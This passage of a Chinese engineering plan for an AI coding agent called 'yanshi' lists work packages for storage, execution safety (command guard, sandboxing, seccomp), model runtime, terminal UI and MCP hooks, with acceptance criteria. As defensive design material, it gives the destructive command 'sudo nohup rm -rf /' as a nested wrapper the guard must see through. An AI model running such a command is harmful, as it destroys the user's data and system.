| W-D-06 | 检查点 / 快照系统 | B40 | `internal/store` + `internal/vcs` | 可选择性恢复「会话/记忆/文件」之一；恢复前自动快照；恢复期暂停写者；dry-run 先出计划 | INF3 |
| W-D-07 | 记忆引用溯源 | B35 | `internal/store/memory*.go` | 每条记忆可回溯到产生它的日志位置；溯源目标被归档后仍可解析 | INF3, W-D-03 |
| W-D-08 | 持久化用户消息队列 | B75 | `internal/store` + `cmd/yanshi` 新子命令 | 可向**运行中或离线**会话排消息；跨进程可见；会话恢复后队列消息被消费 | INF3 |
| W-D-09 | 输入历史落盘（全局） | B37 | `internal/cli/tui` + `internal/store` | append-only 且带字节上限裁剪；多进程并发写不损坏 | INF3 |
| W-D-10 | 会话列表分页（游标） | B39 | `internal/store` 会话查询 | 游标分页不重不漏；新会话插入不影响已翻页结果 | — |
| W-D-11 | 状态库损坏自愈 | B41 | `internal/store::Open` | 检测到损坏则备份原库并重建；重建后进程正常启动；备份路径写入日志 | — |
| W-D-12 | 一键清空记忆 | B36 | `internal/tools` / 斜杠命令 | 清空需二次确认；按维度（project/agent）可选清空；清空后自动召回不再命中 | — |
| W-D-13 | 上下文片段可识别标记 | B33 | `internal/ctxcompact` | 每条注入片段带 kind 与起止标记；可定位、可剥离、可去重；现有 `SummarySentinel` 归入同一机制 | INF3 |
| W-D-14 | 初始上下文重注入策略 | B31 | `internal/ctxcompact` / orchestrator | mid-turn 插在最后一条 user 前；pre-turn 清空下轮重注；两条路径行为可分别验证 | W-D-13 |
| W-D-15 | 逐 turn 增量重渲染系统提示 | B34 | orchestrator 系统提示构造 | 只发变化段（RFC 7386 merge patch）；`/model` 切换在当前 turn 内对模型可见 | — |
| W-D-16 | 目标跨会话恢复 | B74 | `internal/agent/goalloop` + store | objective 与双预算存 SQLite；进程重启后 goal loop 从中断处续跑；预算不被重置 | INF3 |

**W-D-15 的注意点**：审计说「yanshi 构造期一次拼死，`/model` 切换等当前 turn 内模型看不见」。CLAUDE.md 记载 `/model` 切换走 `runners sync.Map` 以 model 指针为键缓存 —— 改系统提示的重渲染时机会碰到这个缓存，须确认新 runner 拿到的是新提示而不是缓存里的旧值。

---

## 4. 工作包 W-B：执行安全基座（27 条）★第三批交付

**为什么排第三**：F3（危险命令递归穿透）是安全边界，`sudo nohup rm -rf /` 这类嵌套形态现在可能漏判。它被 INF1 吸收（§1.3.2），所以整包越早越好——但 INF3 的浪费更大，故让位一批。

**台账**：不进（F1/F3 是 F 档但按第 2 轮决策只有 W-A 进台账；若主人希望 F 档全进，本包的 F1/F3 两条须补 acceptance 逐句形态）。

**必须先出 ADR**：INF1 改动 guard 的元字符防线语义，须给 **ADR-0004 补一条 Consequences**（不是新开 ADR——决策本身没变，是它的边界被细化了）。

---

### 4.1 基建

#### W-B-01 结构化 shell 解析器 `A7` = **INF1** ✔已核

- **落点** `internal/execpolicy`（新增 `ParseCommandList`）、`internal/guard/guard.go::Guard.checkShell`
- **契约与承重约束** 见 §1.2 INF1
- **验收** 含 `&&`/`;`/`|` 的命令被逐段判定而非整条 HardDeny；任一段为拒绝则整条为拒绝且档位取最严；解析失败仍是结构性 HardDeny；重定向目标路径参与 fs 维度判定
- **依赖** 无
- **门禁** GOV1（guard ↔ execpolicy 依赖方向已存在，确认不新增反向边）、GOV3
- **风险** **本 spec 中攻击面变化最大的一条。** guard 的六维顺序短路是承重设计（CLAUDE.md 专门写了 `checkMCPTools` 排在 `checkTools` 之前的理由），逐段判定必须保持「取最严」而不是「逐段独立放行」。建议实现前先写属性测试：任意命令的逐段判定结果 ⊑ 整条 HardDeny。

#### W-B-02 secproc 强制入口收敛 `F1` = **INF6** ✔已核

- **落点** `internal/tools/shell.go`（factory 分支与其后的直连 pipe 路径）、`internal/acp/spawn.go::exec.CommandContext`、`internal/bootstrap`（`bindExecutionContext` 恒绑）
- **契约与承重约束** 见 §1.2 INF6（建议走「保证 factory 恒绑」这条）
- **验收** `shell_run` 在任何 context 形态下都经过 `secproc.Launch`；直连 pipe 回落路径被删除而非旁路；ACP agent 的子进程发射经过同一入口；未配置沙箱时的默认 factory 仍执行 `Authorize`
- **依赖** 无
- **门禁** GOV1、GOV6（factory 注入器恒绑后 nil 门禁消失，须确认 `SecureProcessFactoryFromContext` 的 `ok=false` 分支消费者一并更新）
- **备注** CLAUDE.md 里「`shell_run` 只在 context 绑了 factory 时走 secproc」那段描述在本条完成后须同步改写，否则文档说的是已消失的行为。

### 4.2 INF1 的推论（4 条）

| ID | 能力 | 源 | 落点 | 验收要点 | 状态 |
|---|---|---|---|---|---|
| W-B-03 | 危险命令递归穿透 | F3 | `internal/guard/prefixrunner.go::stripCommandPrefix` | 嵌套 wrapper（`sudo nohup timeout 5 rm -rf /`）被穿透到真实 program；穿透有层数上限；层数耗尽按最严处理 | ✔已核 |
| W-B-04 | 规则增补（下次不再问） | A8 | `internal/execpolicy` 规则持久化 | 批准时可把规范化后的命令前缀写回策略文件；写回的规则下次生效；高危动词不接受泛化 | ✔已核 |
| W-B-05 | PowerShell 结构化解析 | B12 | `internal/execpolicy` 新前端 | PowerShell 命令解析成同一 `Segment` 抽象；解析失败走 HardDeny | 未核 |
| W-B-06 | 审批缓存 + 命令规范化 | B16 | `internal/guard` / 审批路径 | 同一命令重试不重复弹窗；同义写法（空白、引号、参数顺序）规范化后命中同一缓存项；缓存有作用域与失效 | 未核 |

**W-B-03 的层数上限**：审计说 codex 上限 8 层。**层数耗尽时必须按「最严」处理而非「放行」** —— 这是 fail-closed 原则，审计没写。

**W-B-06 的风险**：命令规范化是**双刃的**。规范化不足 → 缓存不命中（只是烦）；规范化过度 → 两条语义不同的命令共用一个批准（是安全漏洞）。建议规范化只做空白折叠与引号剥离，**不做参数重排**。

### 4.3 INF6 的推论（5 条）

| ID | 能力 | 源 | 落点 | 验收要点 | 状态 |
|---|---|---|---|---|---|
| W-B-07 | 真 PTY 交互式进程 | A4 | `internal/shell/console_unix.go::StartPTYProcess`、`console_windows.go`、`console_other.go` | 三平台各自返回可用 console 而非 `ErrPTYUnavailable`；REPL 与检测 isatty 的程序能正常输出；`Resize` 生效；不支持的平台仍返回哨兵值 | ✔已核 |
| W-B-08 | 进程自身加固 | A12 | 新增 pre-main 初始化 | core dump 被关闭；`PT_DENY_ATTACH`(darwin)/`PR_SET_DUMPABLE=0`(linux) 生效；`LD_*`/`DYLD_*` 被清理；加固失败不阻止启动但记日志 | ✔已核 |
| W-B-09 | seccomp 网络系统调用过滤 | A10 | `internal/sandbox` linux 后端 | 非 AF_UNIX 的 `connect/bind/listen/sendto/socket` 被拦；`ptrace`/`process_vm_readv`/`io_uring` 恒拦；内核不支持时如实降级上报 | ✔已核 |
| W-B-10 | 嵌套 exec 拦截式提权 | B26 | secproc + wrapper | 脚本内部第 N 行的 `sudo` 被单独裁决而非整条重跑；拦截失败 fail-closed | 未核 |
| W-B-11 | API key 代理（子进程不见 key） | B27 | secproc + provider 层 | 子进程环境中不含 provider API key；代理进程持有 key 且内存被锁定 | 未核 |

**W-B-07 的验收必须用 `cmd/tuidbg` 或等价手段**：`internal/shell` 的单测断言不了「REPL 真的能交互」。审计说「shell v2 的 Start/Write/Read 骨架已在，缺的只是 console 实现」—— 实测确认 `internal/shell/console_{unix,windows,other}.go` 三个文件都存在且都返回 `ErrPTYUnavailable`（注释写着 "Phase 0"），骨架属实。

**W-B-09 是本 spec 里唯一能解决一条已知弱点的条目**：审计原文「这是『managed proxy 可被 raw socket 绕过』那条已知弱点的解药 —— codex 的 proxy 敢承认自己是 env-var 级，因为 seccomp 在下面兜底；yanshi 的 proxy 说同样的话时下面是空的」。

**平台验证**：W-B-08/09 与下方 Windows 三条**在开发机（darwin）上无法完整验证**。CI 有 ubuntu/windows/macos 三平台矩阵，**验收证据必须来自 CI 对应 leg，不接受本机跳过**。注意 GOV8 的规则：带 build 约束（含 `_windows_test.go` 这种文件名后缀形态）的测试不能是某条子句的唯一证据——本包不进台账，但同一逻辑仍应遵守。

### 4.4 独立叶子（16 条）

| ID | 能力 | 源 | 落点 | 验收要点 | 状态 |
|---|---|---|---|---|---|
| W-B-12 | 模型主动申请权限 | A9 | `internal/tools/sandboxescalate.go` 旁新增 | 模型可在撞墙前申请；scope 可选本轮/整会话；net 与 fs 分维；申请仍走用户审批 | ✔已核 |
| W-B-13 | 未强制约束逐字段告警 | A11 | `internal/sandbox/types.go::CapabilityReport` | 后端申报真正 enforce 的字段集；未 enforce 的字段逐条 WARNING；doctor 能显示 | ✔已核 |
| W-B-14 | Guardian 政策可定制模板 | B14 | `internal/guard/autoapproval.go` | 提示词模板可由操作员覆盖；覆盖后 `TestAutoApprovalPrompt_CoversEveryRiskCategory` 的四类风险仍被断言 | 未核 |
| W-B-15 | 人工推翻 AI 拒绝 | B15 | 审批路径 | auto 模式的 ASK 判决可由用户显式批准；推翻被审计记录 | 未核 |
| W-B-16 | 网络访问逐域审批 | B17 | `internal/tools` 网络代理 | 代理拦截 HTTP/HTTPS/SOCKS5 逐域询问；批准可保存；未批准的域 fail-closed | 未核 |
| W-B-17 | HTTPS MITM + 域内按方法规则 | B28 | 同上 | CONNECT 后不再是盲隧道；同一域内 GET 与 POST 可分别裁决 | 未核 |
| W-B-18 | 受保护元数据路径 | B19 | `internal/sandbox` / `internal/guard` fs 维 | 即使在可写根下也拒写 `.git`；受保护路径集合可配 | 未核 |
| W-B-19 | 权限档案求交（父子会话） | B18 | 子代理角色收窄处 | 无法安全求交时显式报错而非静默取宽 | 未核 |
| W-B-20 | 四档执行级别 | B20 | `internal/guard/mode.go` | 新档位进 `guard.Modes` 与 `NormalizeMode`；`resolvePermissionMode` 同步 | 未核 |
| W-B-21 | shell 快照与还原 | B13 | `internal/shell` | 捕获并还原 zsh/bash/sh/PowerShell 状态；还原失败不影响会话 | 未核 |
| W-B-22 | 后台交互式进程并发上限 | B76 | `internal/shell` / `task_shell_*` | 并发上限可配；超限时排队而非拒绝 | 未核 |
| W-B-23 | Linux Landlock 真机验证 | B21 | `internal/sandbox/sandbox_linux_landlock.go` | 在带 `CONFIG_SECURITY_LANDLOCK` 的 CI leg 上实测拦截生效；内核不支持时如实降级 | 未核 |
| W-B-24 | Windows Job Object 真跑 | B22 | `internal/sandbox` windows 后端 | 在 CI windows leg 上实测进程树限制生效 | 未核 |
| W-B-25 | Windows 受限令牌 + ACL | B23 | `internal/sandbox` windows 后端 | `CreateRestrictedToken` + capability SID 打 ACL + 独立桌面 + WFP 网络过滤；CI windows leg 验证 | 未核 |
| W-B-26 | Windows deny-read + reparse | B24 | 同上 | 敏感路径加 deny-read ACE；覆盖 reparse 解析后的真实路径 | 未核 |
| W-B-27 | 内置 bwrap 二进制 + 摘要校验 | B25 | `internal/sandbox` linux 后端 | 自带 bwrap；摘要校验失败则拒绝启动沙箱 | 未核 |

**W-B-27 与单二进制定位的张力**：内嵌 bwrap 会显著增大二进制体积。**这条建议降级为「可选，按需再评估」** —— 它解决的是「宿主没装 bwrap」，而当前代码已能如实降级上报（`DegradedHostGuard`）。若主人认为体积不是问题，按表实施。

---

## 5. 工作包 W-C：模型运行时（15 条）★第四批交付

**为什么排第四**：INF2 解锁 11 条，是解锁密度最高的基建，但**没有哪一条是「已交付功能坏了」** —— 缺 header 是接不上一类 provider（明确的功能缺失），不是把已有的东西弄坏了。故让位给 W-A/W-D/W-B。

**台账**：不进。

---

### 5.1 基建

#### W-C-01 数据驱动模型能力目录 `A20` = **INF2** ✔已核

- **落点** `internal/llm/eino/contextwindow.go`、`internal/llm/eino/pricing.go`（两个 Go 字面量表）→ 新增 embed 的 `models.yaml`；`internal/config/config.go::ProviderConfig` 作为覆盖层
- **契约与承重约束** 见 §1.2 INF2
- **验收** 新增一个模型只需改数据文件不需改 Go 代码；表中查不到的模型走安全默认且不阻止启动；`ProviderConfig` 的同名字段覆盖表值；压缩阈值按窗口比例而非绝对值取自表
- **依赖** 无
- **门禁** GOV1（新数据包的依赖方向）、GOV3
- **注意** CLAUDE.md 记着 ADR-0013 的量纲约束与 W4 修过的 mid-turn 窗口传递路径（`runnerFor` → `TurnOpts.ModelID` → `CompactionConfig.ProviderWindows` → `wrapCompaction`）。改窗口来源时**两条路径都要改**，pre-turn 那条走 handler 查 `windows` map。只改一条会重现 W4 之前的缺陷：门永不触发。

### 5.2 INF2 的推论（9 条）

| ID | 能力 | 源 | 落点 | 验收要点 | 状态 |
|---|---|---|---|---|---|
| W-C-02 | provider 自定义 HTTP 头 | A18 | `internal/config/config.go::ProviderConfig` 新增 `headers` | 配置的头出现在实际请求中；`${VAR}` 展开生效；头值不进日志/遥测（走 INF8 Redactor） | ✔已核 |
| W-C-03 | Ollama 深度集成 | A21 | `internal/llm/eino` discovery | 探活双端点；`/api/tags` 列模型；`/api/pull` NDJSON 流式拉取带进度；不可用时如实报告 | ✔已核 |
| W-C-04 | token 预算式压缩兜底 | A14 | `internal/ctxcompact::RunSummary` 调用点 | summary 模型失败时不调模型直接开新窗口；兜底路径不丢 pin 的消息；兜底被记录到 activity line | ✔已核 |
| W-C-05 | LM Studio 集成 | B46 | 同 W-C-03 的 discovery 接口 | 探活、列模型、`load_model` 预热 | 未核 |
| W-C-06 | 模型发现磁盘缓存 | B43 | `internal/llm/eino` discovery | ETag + TTL 磁盘缓存；离线时用缓存启动；三档刷新策略 | 未核 |
| W-C-07 | per-provider 重试次数 | B44 | `ProviderConfig` + 重试逻辑 | 每 provider 独立 MaxRetries；未设置时回退全局值 | 未核 |
| W-C-08 | 配额窗口头解析 | B45 | provider 响应处理 | 解析 `x-*-primary-used-percent`/window-minutes/reset-at；撞限前降速 | 未核 |
| W-C-09 | 工具输出截断策略可配 | B32 | `internal/tools` 输出处理 | 头尾保留策略可配；截断处有明确标记；策略取自 INF2 的表 | 未核 |
| W-C-10 | 压缩模型回退 | B30 | `internal/ctxcompact` + provider | 超窗/限额/过载时换模型重试；回退链在 INF2 表里声明；回退被记录遥测 | 未核 |

**W-C-02 的安全要点**：自定义头**极可能承载凭据**（Azure API key、企业网关 token）。必须确认它走 INF8 的 Redactor 出口管线，否则这条特性会亲手制造一个新的凭据泄漏面。**这是 W-C 依赖 W-A-02 的原因。**

**W-C-04 的兜底语义**：审计说 codex 的兜底是「不调模型直接开新窗口」。这意味着**丢弃历史**。必须确认 pin 的消息（尾部、user 原文、working-set 路径、错误/diff 标记、里程碑）在兜底路径里仍被保留 —— 否则兜底本身成了数据丢失。

### 5.3 独立叶子（5 条）

| ID | 能力 | 源 | 落点 | 验收要点 | 状态 |
|---|---|---|---|---|---|
| W-C-11 | 模型可查剩余 token | A6 | 新工具；预算来自 `internal/loopguard/budget.go`、`internal/ctxcompact/budget.go` | 模型可查询当前 turn 剩余 token 与上下文剩余；数值与压缩门用的是同一来源；工具在组合根注册且进默认 profile | ✔已核 |
| W-C-12 | 命令式 token 鉴权 | A19 | `ProviderConfig` 新增 `auth.command` | 凭据由外部命令产出；按 refresh_interval 刷新；401 后重跑命令；命令走 secproc（W-B-02） | ✔已核 |
| W-C-13 | 错误分类补 404 与 content_safety | B42 | `internal/llm/eino` 错误分类 | 404 触发 provider failover 而非判不可重试；`content_safety` 单独成类且不重试 | 未核 |
| W-C-14 | 模型主动开新窗口 | B11 | 新工具 | 模型可不摘要直接开新窗；新窗口大小取自 INF2 表；开窗被记录 | 未核 |
| W-C-15 | 多模态能力探针（实测） | B47 | discovery | 实测图像支持而非只读配置；标记来源是文档还是实测 | 未核 |

**W-C-11 的注册要求**（反「零读者」）：新工具必须在组合根注册，否则运行期被 `internal/toolreg` 的 fail-closed 检查拒掉 —— 症状是「工具在 schema 里、模型能调、每次都被拒」，而 GOV5 看不见这个方向。同时须进默认 profile 的 allow list（GOV5 会校验反向），并在 `internal/bootstrap/w3wiring_test.go` 里加一行断言。

**W-C-12 的安全要点**：`auth.command` 是**执行任意命令**的配置项。它必须走 W-B-02 收敛后的 secproc 入口，且**不能**因为「是操作员自己写的配置」就跳过 —— config 文件可能来自模板、来自团队共享、来自被改写的仓库。

---

## 6. 工作包 W-E：TUI 交互（16 条）★第五批交付

**为什么排第五**：审计的 P1 第一梯队（Esc-Esc、外部编辑器、diff 高亮、Ctrl+T）都在这里，日常收益最高，但**它们不影响正确性**。W-A 到 W-C 修的是「结果是错的」，这里改的是「用起来难受」。

**台账**：不进。

**本包的验证纪律（承重）**：`internal/cli/tui` 的单测断言的是 `Model.Update`/`View` 的返回值。**启动崩溃与布局错位在它们全绿时照样复现**。因此本包每条的验收都必须包含一次 `cmd/tuidbg` 实测（`skills/tui-debug/SKILL.md`）：起 tmux 会话、发按键、把渲染后的屏幕读回成文本。`capture-pane` **必须带 `-J`** —— 不加则按物理屏幕折行，跨行正则静默失配。

---

### 6.1 基建

#### W-E-01 终端能力探测与渲染层 `B64` = **INF5** 未核

- **落点** `internal/cli/tui`（当前硬编码 `termenv.ANSI256`；`NO_COLOR`/`COLORTERM`/`TERM=dumb` 全仓零命中——实测确认）
- **契约与承重约束** 见 §1.2 INF5
- **验收** `NO_COLOR=1` 时输出不含 ANSI 颜色序列；`TERM=dumb` 时不发送 alt-screen 与颜色；`COLORTERM=truecolor` 时使用 24bit；256/16 色终端各有可读配色；探测结果可被 `-h` 或 doctor 显示
- **依赖** 无
- **门禁** GOV2（`internal/cli/tui` 若有文件接近 5000 行预警带需留意）
- **备注** 「所有颜色常量改为从 `Palette` 取」是一次大范围机械改动，建议单独一个提交、与后续特性分开，便于回滚。

### 6.2 INF5 的推论（9 条）

| ID | 能力 | 源 | 落点 | 验收要点 | 状态 |
|---|---|---|---|---|---|
| W-E-02 | diff 语法高亮 + 行号 | A31 | **先合并** `internal/tools/fs_diff.go::unifiedDiff` 与 `internal/cli/tui/diff.go::unifiedDiff`，再扩展 | 两处重复实现被合并为一个公共函数；diff 带行号；按 Palette 分档着色；`fs_write` 新文件显示内容而非仅 "wrote N lines" | ✔已核 |
| W-E-03 | Ctrl+T transcript 全屏浮层 | A30 | `internal/cli/tui` 新浮层 | Ctrl+T 打开独立 pager；支持实时 tail；有 raw 复制模式绕开 alt-screen 的选择失效 | ✔已核 |
| W-E-04 | 桌面通知（OSC9 / BEL） | B65 | 渲染层 | 长任务结束时发送 OSC9；终端不支持时降级为 BEL 或静默；可关闭 | 未核 |
| W-E-05 | 终端标题 / 状态栏 | B66 | 渲染层 | 标题显示项目与会话状态；退出时恢复原标题 | 未核 |
| W-E-06 | OSC 8 语义超链接 | B67 | 渲染层 | 文件路径与 PR 链接可点；不支持的终端降级为纯文本 | 未核 |
| W-E-07 | 流式 markdown 渐进渲染 | B69 | 流式 pending 渲染 | 流式过程中表格与格式渐进呈现而非等结束；渲染中断不留残缺状态 | 未核 |
| W-E-08 | 会话恢复选择器（带预览） | B70 | `/sessions` | 列表带 transcript 预览；预览不加载全量历史（走 W-D-05 反向扫描） | 未核 |
| W-E-09 | 分支摘要 / PR 状态 | B61 | 状态区 | 显示分支、与默认分支的增删行、经 `gh` 查开放 PR；`gh` 不可用时静默降级 | 未核 |
| W-E-10 | Ctrl+Z 挂起恢复 | B72 | Bubble Tea 集成 | Ctrl+Z 挂起后 `fg` 能正确恢复 alt-screen 与终端状态 | 未核 |

**W-E-02 的前置动作**：先把两处 `unifiedDiff` 合并。这不是顺手的重构 —— 不合并的话高亮与行号要写两遍，且 W-F 的回合级聚合 diff（A2）会成为第三份。合并落点建议放在一个下层叶子包（`internal/tools` 与 `internal/cli/tui` 之间无依赖边，直接互相 import 会撞 GOV1）。

**W-E-08 依赖 W-D-05**：预览若全量加载历史，长会话的 `/sessions` 会卡住。

### 6.3 独立叶子（6 条）

| ID | 能力 | 源 | 落点 | 验收要点 | 状态 |
|---|---|---|---|---|---|
| W-E-11 | Esc-Esc 回溯 fork | A29 | `internal/cli/tui`（服务端能力已有：`commands_session_memory.go::cmdFork` → `internal/proto/frame.go::NewForkSession`） | 连按两下 Esc 进入回溯选择；确认后 fork 并**把原 prompt 自动填回编辑框**；单次 Esc 的现有行为不变 | ✔已核 |
| W-E-12 | 外部编辑器起草长 prompt | A28 | `internal/cli/tui`（全仓 `tea.Exec`/`EDITOR`/`VISUAL` 零命中——实测确认） | 快捷键唤起 `$EDITOR`/`$VISUAL`；编辑器退出后内容回到输入框；编辑器不存在或退出非零时不丢已输入内容 | ✔已核 |
| W-E-13 | `/diff` 看工作区改动 | B68 | `commandTable` 新命令 | 显示工作区改动无需切窗口；复用 W-E-02 的渲染 | 未核 |
| W-E-14 | 多类目提及搜索 | B62 | `@` 补全 | 全部/文件系统/插件三模式循环切换 | 未核 |
| W-E-15 | 交互式键位向导 | B63 | `/keymap` 扩展 | 捕获按键、检测冲突、写回偏好文件（原子写） | 未核 |
| W-E-16 | 首次运行引导 | B71 | TUI 内向导 | 首次启动引导配置 provider 与 profile；可跳过；跳过后不再提示 | 未核 |

**W-E-11 的实现要点**：服务端能力齐备（实测 `cmdFork` 与 `NewForkSession` 都在），缺的**只是零打字的交互路径**。审计说「上一句问歪了」是最高频动作 —— 这条是本包投入产出比最高的。注意 `internal/cli/tui` 现有 7 处 `KeyEsc` 处理，双击检测要与它们共存而不是替换。

**W-E-13 须注册进 `commandTable`**：`internal/archtest/slashcmd_test.go::TestPhantomSlashCommandsNotAdvertised` 扫 `.md`/`.yaml`/`.go`/`.json` 四种载体。`phantomSlashCommands` 当前是空 map，所以新命令名不会被拦；但**文档里写了却没注册**仍然是虚报，只是这道门禁抓不到（它是 denylist 不是白名单）。

---

## 7. 工作包 W-F：扩展与协作（33 条）★第六批交付

**最大的一包。** 含两条基建（INF4 Hook 总线、INF7 MCP readLoop）与 24 条 P2 叶子。

**台账**：不进。

**包内排序**：**INF7 排最前** —— 审计自己写了「这条更像兼容性 bug，可考虑提到 P0」，现代 MCP server 在 yanshi 下会挂死或静默丢，性质接近「已交付功能坏了」。

---

### 7.1 基建

#### W-F-01 MCP 双向传输（readLoop）`A22` = **INF7** ✔已核

- **落点** `internal/mcp/stdio.go`（实测 `readLoop` 与 `go func` 均零命中，确为严格 req→resp）
- **契约与承重约束** 见 §1.2 INF7
- **验收** server 主动发送的 notification 被分发而非丢弃；server 发起的反向 request 得到响应；长任务的 progress 通知到达客户端；`listChanged` 触发工具表刷新；反向请求内容按不可信数据处理
- **依赖** 无
- **门禁** GOV3
- **安全要点** server 发来的 elicitation 是**外部输入**。参照 `pr_context` 把 PR 正文标为数据防提示注入的做法（那是本仓独有的护城河），反向请求的文本必须同样标注。

#### W-F-02 生命周期 Hook 总线 `A1` = **INF4** ✔已核

- **落点** `internal/agent/orchestrator`（复用 loopguard middleware 链与 per-turn context 注入）
- **契约与承重约束** 见 §1.2 INF4
- **验收** `PreToolUse` 可阻断工具调用并给出理由；`PreToolUse` 改写 `updated_input` 后**重新执行 guard 判决**；hook 无法把 guard 的拒绝翻成允许；hook 子进程走 secproc；hook 超时/崩溃不中断 turn
- **依赖** W-B-02（INF6，hook 是不受信程序）
- **门禁** GOV3、GOV4、GOV6
- **风险** 第 2 条验收（改写后重跑 guard）是**本 spec 中最容易被实现漏掉、且漏掉后最危险的一条**。建议先写这条的测试再写实现。

### 7.2 INF7 的推论（4 条）

| ID | 能力 | 源 | 落点 | 验收要点 | 状态 |
|---|---|---|---|---|---|
| W-F-03 | 模型中途向用户提问 | A3 | `internal/proto/frame.go` 新帧 + WS 处理 | 模型可发起提问并等待回答；WS 上走双向通道；**SSE 上必须显式降级**（无双向通道）；超时按未回答处理 | ✔已核 |
| W-F-04 | MCP 资源读取与订阅 | B49 | `internal/mcp` | 列举/分页/读取资源；订阅资源变更事件 | 未核 |
| W-F-05 | MCP 协议版本兼容 | B51 | `internal/mcp` | 在两版协议间切换；版本协商失败时如实报错 | 未核 |
| W-F-06 | 把自己作为通用 MCP server | B52 | `internal/acpserver` 旁 / 新子命令 | 暴露可续接会话的工具（不止 `vcs-mcp` 的 5 个 VCS 工具）；别的 agent 能把 yanshi 当子 agent 调 | 未核 |

**W-F-03 的传输不对称**（CLAUDE.md 承重约束）：`ClientFrame` **只有 WS 在用**，SSE 用 `chat.go` handler 内自己的匿名请求结构体，v1（`internal/api/v1/types.go`）是第三套。给 `ClientFrame` 加请求字段对 SSE/v1 **完全无效**，且 `json.Decode` 静默忽略未知键 —— 漏加不报任何错，字段只是无声消失。**这条特性的服务端→客户端方向走共享的 `ServerFrame`（`frame.go` + `ws.go` + `ssebackend.go` 三处同改），客户端→服务端方向必须在三套请求结构体里各声明一次，或明确宣告 SSE 不支持。**

### 7.3 INF4 的推论（4 条）

| ID | 能力 | 源 | 落点 | 验收要点 | 状态 |
|---|---|---|---|---|---|
| W-F-07 | 防伪完成的续跑提示词 | A32 | `internal/agent/goalloop` + `Stop` hook | 无进展判定生效；完成审计在 judge 之外独立成一道；**阻塞需连续三轮**才认定 | ✔已核 |
| W-F-08 | 压缩生命周期 hook | B29 | `internal/ctxcompact` | Pre/PostCompact 事件；**三条压缩路径共用同一总线**（pre-turn、mid-turn、手动 `/compact`） | 未核 |
| W-F-09 | Hook 输出溢出落盘 | P2-1 | 复用 `internal/tools/spillover.go` | 超阈值的 hook 输出落盘留引用；引用可经 `artifact_read` 取回 | 未核 |
| W-F-10 | 隐式 skill 调用识别 | B54 | `PostToolUse` hook | 从 shell 命令识别读了 SKILL.md 或跑了 skill 的 `scripts/`；识别结果不进模型上下文（避免自指循环） | 未核 |

**W-F-07 的价值**：yanshi 的 goalloop 编排比 codex 完整（四阶段 + 三类评估器 + 聚合裁判，是护城河），但**judge 是评估器投票，没有针对「模型谎报完成」的提示词级防线**。这条补的是提示词层，不替换评估器。

### 7.4 独立叶子（23 条）

| ID | 能力 | 源 | 落点 | 验收要点 | 状态 |
|---|---|---|---|---|---|
| W-F-11 | 按需加载工具 spec | A5 | 工具 schema 构造 | **131 个**注册工具不再全量进 schema；按检索（BM25 或等价）选取；未加载的工具可被模型显式请求加载 | ✔已核 |
| W-F-12 | 每 server 工具 allow/deny | A23 | `internal/config/config.go::MCPServerConfig` | 可按工具名粒度开关；空 allow 仍是 fail-closed（guard mcp 维度语义不变） | ✔已核 |
| W-F-13 | 回合级聚合 diff | A2 | 合并后的公共 diff 函数（见 W-E-02） | 累积本轮净 diff；超时降级为不显示而非阻塞；goalloop evaluate 可消费 | ✔已核 |
| W-F-14 | 角色文件化 | A25 | `internal/tools/agentroles.go`（实测 7 个硬编码 RoleDef：general/explore/plan/review/implementer/verifier/custom） | 角色可由 `{config}/agents/*.yaml` 定义；内置 7 个作为默认；自定义角色的工具白名单受 guard 约束 | ✔已核 |
| W-F-15 | plugin manifest 一体化 | A24 | `internal/skills/plugins.go`（实测第 43-47 行只认 `skills/` 目录） | 一个 manifest 同时声明 skills + MCP servers + hooks；缺失的段落不阻止加载其余段落 | ✔已核 |
| W-F-16 | agent 间消息总线 | B55 | `internal/tools/subagent.go` 旁 | spawn/message/followup/result 四类；现有 `send_input` 归入同一总线 | 未核 |
| W-F-17 | 带历史 fork 派生子代理 | B56 | 子代理 spawn | 可选 `FullHistory` / `LastNTurns(n)`；不指定时行为与现在一致 | 未核 |
| W-F-18 | agent 血缘图查询 | B57 | agent registry | 列活跃后代；杀掉整棵子树；registry 现有 ParentID 被真正消费 | 未核 |
| W-F-19 | 异步向用户发消息 | P2-2 | `ServerFrame` 新帧 | 发出后立即返回；回复异步到达；WS/SSE 两处同步 | 未核 |
| W-F-20 | 任务类型分派 | P2-3 | orchestrator turn 生命周期 | 区分 regular/compact/review/user_shell 四类；各类的 hook 事件与预算独立 | 未核 |
| W-F-21 | 独立代码评审子会话 | P2-4 | `review` 工具 | 评审在独立会话形态中进行；评审历史不污染主会话 | 未核 |
| W-F-22 | 并行工具调用 | P2-5 | ADK 工具分发 | 同轮多工具并发执行；可取消；每个仍各自 `Authorize` | 未核 |
| W-F-23 | 动态工具（运行时注入） | P2-6 | 工具注册 | 客户端可注入 function 规格；注入的工具受 `internal/toolreg` 运行期检查 | 未核 |
| W-F-24 | 补丁模糊匹配分级放宽 | P2-7 | `fs_patch` | 精确→忽略尾空白→忽略首尾→Unicode 归一四级；命中级别可见 | 未核 |
| W-F-25 | 补丁 dry-run 成 diff 供审批 | P2-8 | `fs_patch` | 不写盘就算出结果给审批；审批后应用的结果与预览一致 | 未核 |
| W-F-26 | 补丁用 grammar 约束 | B9 | 工具 spec | 大 patch 不再作为 JSON string 传递（转义是真实故障源）；grammar 约束或等价的免转义通道 | 未核 |
| W-F-27 | web_search 后端可插拔 | B10 | `internal/tools` web_search 构造函数 | DuckDuckGo HTML 端点不再写死；后端可配；正则刮 HTML 的路径有失败检测而非静默返回空 | 未核 |
| W-F-28 | MCP 工具目录缓存 | B48 | `internal/mcp` | 按连接身份 + 配置指纹 LRU 缓存 schema；配置变更即失效 | 未核 |
| W-F-29 | MCP 重定向同源限制 | B50 | `internal/mcp` HTTP transport | 跨源重定向不携带凭据 | 未核 |
| W-F-30 | 模型撰写新技能 | B53 | `skill_write` | 不再强制要求 user skills dir；写入受技能安全扫描门禁 | 未核 |
| W-F-31 | 预算耗尽软着陆 | B73 | `internal/agent/goalloop` | 耗尽时注入收尾提示而非硬切；收尾本身有预算上限 | 未核 |
| W-F-32 | 定时休眠工具 | B77 | 新工具 | 模型可休眠至多 N 小时；新输入提前唤醒；休眠期不占用 turn 预算 | 未核 |
| W-F-33 | Mission 多阶段 | B78 | `internal/agent/goalloop` | PRD→实现→验证的阶段划分；goalloop 已覆盖的部分不重复实现 | 未核 |

**编号说明**：本包 33 条 = 2 基建 + 4（INF7 推论）+ 4（INF4 推论）+ 23 叶子。「未强制约束逐字段告警」的实体在 W-B-13，本包不重复计数。

